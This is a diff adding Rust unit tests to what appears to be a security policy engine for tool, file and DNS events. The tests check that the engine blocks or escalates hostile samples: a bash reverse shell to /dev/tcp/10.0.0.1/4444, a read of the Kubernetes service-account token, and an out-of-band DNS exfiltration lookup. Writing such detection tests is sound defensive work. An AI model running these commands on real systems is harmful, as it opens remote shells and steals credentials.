@@ -469,4 +469,31 @@ mod tests {
 
         std::fs::remove_dir_all(&dir).ok();
     }
+
+    #[test]
+    fn blocks_reverse_shell_critical() {
+        let d = engine().evaluate(&ev(
+            r#"{"event":{"ToolExec":{"pid":1,"argv":["bash","-i",">&","/dev/tcp/10.0.0.1/4444","0>&1"]}}}"#,
+        ));
+        assert_eq!(d.verdict, Verdict::Block);
+        assert_eq!(d.severity, Severity::Critical);
+    }
+
+    #[test]
+    fn escalates_k8s_serviceaccount_token_read() {
+        let d = engine().evaluate(&ev(
+            r#"{"event":{"FileAccess":{"pid":1,"path":"/var/run/secrets/kubernetes.io/serviceaccount/token","write":false}}}"#,
+        ));
+        assert_eq!(d.verdict, Verdict::Escalate);
+        assert!(d.reason.contains("read-credentials"));
+    }
+
+    #[test]
+    fn escalates_out_of_band_exfil_dns() {
+        let d = engine().evaluate(&ev(
+            r#"{"event":{"Dns":{"pid":1,"query":"abcd1234.oast.fun"}}}"#,
+        ));
+        assert_eq!(d.verdict, Verdict::Escalate);
+        assert!(d.reason.contains("suspicious-dns"));
+    }
 }
